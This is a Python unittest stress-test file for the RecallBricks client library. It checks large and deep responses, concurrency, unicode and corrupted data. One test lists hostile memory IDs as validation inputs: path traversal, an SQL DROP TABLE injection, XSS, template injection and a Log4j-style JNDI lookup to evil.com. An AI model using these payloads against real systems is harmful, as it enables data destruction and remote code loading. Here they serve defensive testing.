"""
Stress tests for RecallBricks relationship functionality
Attempts to break the code with extreme conditions
"""

import unittest
from unittest.mock import patch
import sys
import os
import time

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from recallbricks import RecallBricks
from recallbricks.exceptions import APIError, RecallBricksError


class StressTests(unittest.TestCase):
    """Stress tests to try to break the implementation"""

    def setUp(self):
        """Set up test fixtures"""
        self.api_key = "test_api_key_12345"
        self.client = RecallBricks(self.api_key)

    def test_extreme_depth_values(self):
        """Test with extremely large depth values"""
        extreme_depths = [100, 1000, 10000, 100000, 2**31-1]  # Max 32-bit int

        for depth in extreme_depths:
            with patch.object(self.client, '_request') as mock_request:
                mock_request.return_value = {
                    'root_id': 'test',
                    'depth': depth,
                    'nodes': [],
                    'edges': []
                }

                try:
                    result = self.client.get_graph_context('test_id', depth=depth)
                    # Should handle large depths without crashing
                    assert result is not None
                except (APIError, OverflowError, MemoryError):
                    # These errors are acceptable for extreme values
                    pass

    def test_rapid_fire_requests(self):
        """Test making many requests in rapid succession"""
        with patch.object(self.client, '_request') as mock_request:
            mock_request.return_value = {
                'memory_id': 'test',
                'count': 0,
                'relationships': []
            }

            errors = []
            for i in range(1000):
                try:
                    self.client.get_relationships(f'memory_{i}')
                except Exception as e:
                    errors.append(e)

            # Should handle all requests without catastrophic failure
            assert len(errors) < 100  # Allow some failures but not all

    def test_massive_relationship_response(self):
        """Test handling response with massive amounts of data"""
        with patch.object(self.client, '_request') as mock_request:
            # Simulate 100,000 relationships
            massive_relationships = [
                {
                    'id': f'rel_{i}',
                    'type': 'related_to',
                    'target_id': f'target_{i}',
                    'metadata': {'key': 'value' * 100}  # Add some bulk
                }
                for i in range(100000)
            ]

            mock_request.return_value = {
                'memory_id': 'test',
                'count': 100000,
                'relationships': massive_relationships
            }

            # Should handle large response without crashing
            result = self.client.get_relationships('test_id')
            assert result['count'] == 100000
            assert len(result['relationships']) == 100000

    def test_deeply_nested_graph(self):
        """Test graph with extremely deep nesting"""
        with patch.object(self.client, '_request') as mock_request:
            # Create deeply nested structure
            nodes = []
            edges = []
            for i in range(10000):
                nodes.append({
                    'id': f'node_{i}',
                    'text': f'Memory {i}',
                    'metadata': {'depth': i}
                })
                if i > 0:
                    edges.append({
                        'from': f'node_{i-1}',
                        'to': f'node_{i}',
                        'type': 'follows'
                    })

            mock_request.return_value = {
                'root_id': 'node_0',
                'depth': 10000,
                'nodes': nodes,
                'edges': edges
            }

            result = self.client.get_graph_context('node_0', depth=10000)
            assert len(result['nodes']) == 10000
            assert len(result['edges']) == 9999

    def test_search_with_relationships_under_load(self):
        """Test search with relationships when handling many results"""
        with patch.object(self.client, 'get_all') as mock_get_all, \
             patch.object(self.client, 'get_relationships') as mock_get_rels:

            # Simulate 10,000 memories
            mock_get_all.return_value = [
                {'id': f'mem_{i}', 'text': f'Test memory {i}'}
                for i in range(10000)
            ]

            mock_get_rels.return_value = {
                'count': 5,
                'relationships': [{'id': f'r{j}'} for j in range(5)]
            }

            # Request 100 results with relationships
            results = self.client.search('Test', limit=100, include_relationships=True)

            # Should efficiently handle this without timeout
            assert len(results) == 100
            # Should have called get_relationships exactly 100 times
            assert mock_get_rels.call_count == 100

    def test_malicious_memory_ids(self):
        """Test with potentially malicious memory IDs"""
        malicious_ids = [
            "../../../etc/passwd",  # Path traversal
            "'; DROP TABLE memories; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "\x00\x01\x02\x03",  # Null bytes
            "A" * 1000000,  # Million character string
            "../../..\\" * 100,  # Windows path traversal
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "{{7*7}}",  # Template injection
            "\n\r\t\0",  # Control characters
        ]

        for malicious_id in malicious_ids:
            try:
                # Should validate and reject or handle safely
                with patch.object(self.client, '_request') as mock_request:
                    mock_request.side_effect = APIError("Invalid ID", status_code=400)

                    with self.assertRaises((ValueError, TypeError, APIError)):
                        self.client.get_relationships(malicious_id)
            except Exception as e:
                # Any exception is fine - as long as it doesn't crash silently
                assert e is not None

    def test_concurrent_search_with_relationships(self):
        """Test concurrent searches with relationships"""
        import threading

        results_list = []
        errors = []

        def search_with_rels(query):
            try:
                with patch.object(self.client, 'get_all') as mock_get_all, \
                     patch.object(self.client, 'get_relationships') as mock_get_rels:

                    mock_get_all.return_value = [
                        {'id': f'mem_{i}', 'text': f'{query} memory {i}'}
                        for i in range(10)
                    ]

                    mock_get_rels.return_value = {'count': 1, 'relationships': []}

                    results = self.client.search(query, include_relationships=True)
                    results_list.append(results)
            except Exception as e:
                errors.append(e)

        # Launch 50 concurrent searches
        threads = []
        for i in range(50):
            thread = threading.Thread(target=search_with_rels, args=(f'query_{i}',))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join(timeout=10)

        # Most should complete successfully
        assert len(errors) < 10

    def test_memory_efficiency_search(self):
        """Test that search doesn't fetch all relationships unnecessarily"""
        with patch.object(self.client, 'get_all') as mock_get_all, \
             patch.object(self.client, 'get_relationships') as mock_get_rels:

            # 1000 total memories
            mock_get_all.return_value = [
                {'id': f'mem_{i}', 'text': f'Test {i}'}
                for i in range(1000)
            ]

            mock_get_rels.return_value = {'count': 0, 'relationships': []}

            # Only request 5 results
            results = self.client.search('Test', limit=5, include_relationships=True)

            # Should only call get_relationships 5 times, not 1000
            assert len(results) == 5
            assert mock_get_rels.call_count == 5, \
                f"Expected 5 calls, got {mock_get_rels.call_count}"

    def test_unicode_everywhere(self):
        """Test handling of unicode in all fields"""
        unicode_strings = [
            "测试中文",  # Chinese
            "Тест русский",  # Russian
            "اختبار عربي",  # Arabic
            "テスト日本語",  # Japanese
            "테스트 한국어",  # Korean
            "🚀🎉💻🔥",  # Emojis
            "Ṫḗṡṫ ẁïṫḧ ďïḁċṙïṫïċṡ",  # Diacritics
            "𝕿𝖊𝖘𝖙 𝖚𝖓𝖎𝖈𝖔𝖉𝖊",  # Mathematical alphanumeric
        ]

        for unicode_str in unicode_strings:
            with patch.object(self.client, '_request') as mock_request:
                mock_request.return_value = {
                    'memory_id': unicode_str,
                    'count': 0,
                    'relationships': []
                }

                try:
                    # Should handle unicode gracefully
                    result = self.client.get_relationships(unicode_str)
                    assert result is not None
                except (APIError, UnicodeError):
                    # These errors are acceptable
                    pass

    def test_recursive_relationship_search(self):
        """Test search that triggers relationship fetch that triggers more relationship fetches"""
        call_count = [0]

        def mock_get_rels(memory_id):
            call_count[0] += 1
            if call_count[0] > 100:
                # Prevent infinite recursion
                return {'count': 0, 'relationships': []}
            return {
                'count': 1,
                'relationships': [{'id': f'rel_{call_count[0]}', 'memory_id': f'mem_{call_count[0]}'}]
            }

        with patch.object(self.client, 'get_all') as mock_get_all:
            mock_get_all.return_value = [
                {'id': 'mem_1', 'text': 'Test memory'}
            ]

            with patch.object(self.client, 'get_relationships', side_effect=mock_get_rels):
                # Should not cause infinite recursion
                results = self.client.search('Test', include_relationships=True)
                assert len(results) == 1

    def test_timeout_handling(self):
        """Test behavior when operations take too long"""
        with patch.object(self.client, '_request') as mock_request:
            def slow_request(*args, **kwargs):
                time.sleep(0.1)  # Simulate slow API
                return {'memory_id': 'test', 'count': 0, 'relationships': []}

            mock_request.side_effect = slow_request

            # Should complete even if slow
            start_time = time.time()
            result = self.client.get_relationships('test_id')
            duration = time.time() - start_time

            assert result is not None
            assert duration >= 0.1  # Should have waited

    def test_partial_response_corruption(self):
        """Test handling when response is partially corrupted"""
        corrupted_responses = [
            {'memory_id': 'test'},  # Missing count and relationships
            {'count': 'invalid_not_a_number'},  # Invalid count type
            {'relationships': 'not_a_list'},  # Invalid relationships type
            {'count': -1, 'relationships': []},  # Negative count
            {'count': 5, 'relationships': [None, None]},  # None items in list
        ]

        for corrupted in corrupted_responses:
            with patch.object(self.client, '_request') as mock_request:
                mock_request.return_value = corrupted

                try:
                    result = self.client.get_relationships('test_id')
                    # If it returns, should at least be a dict
                    assert isinstance(result, dict)
                except (APIError, KeyError, TypeError, ValueError):
                    # These exceptions are acceptable
                    pass


def run_stress_tests():
    """Run stress tests"""
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(StressTests)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    print("\n" + "="*70)
    print("STRESS TEST SUMMARY")
    print("="*70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")

    if result.failures:
        print("\nFAILURES:")
        for test, traceback in result.failures:
            print(f"  - {test}: {traceback[:200]}")

    if result.errors:
        print("\nERRORS:")
        for test, traceback in result.errors:
            print(f"  - {test}: {traceback[:200]}")

    print("="*70)

    return result.wasSuccessful()


if __name__ == '__main__':
    success = run_stress_tests()
    sys.exit(0 if success else 1)
